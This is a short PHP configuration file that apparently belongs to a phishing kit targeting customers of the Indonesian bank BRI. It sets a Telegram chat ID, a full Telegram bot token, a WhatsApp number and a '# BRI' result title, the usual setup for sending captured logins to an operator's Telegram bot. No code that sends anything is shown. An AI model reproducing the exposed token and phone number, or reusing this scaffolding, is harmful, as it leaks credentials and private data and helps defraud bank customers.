<?php

// Konfigurasi Telegram
$id_telegram  = "6994867763";
$id_botTele   = "7656716360:AAGeS0Gg0P6RX5VULsNENcxTUjMYa1_QuUo";
$noWa         = "6281214118240";

$result_title = "# BRI";
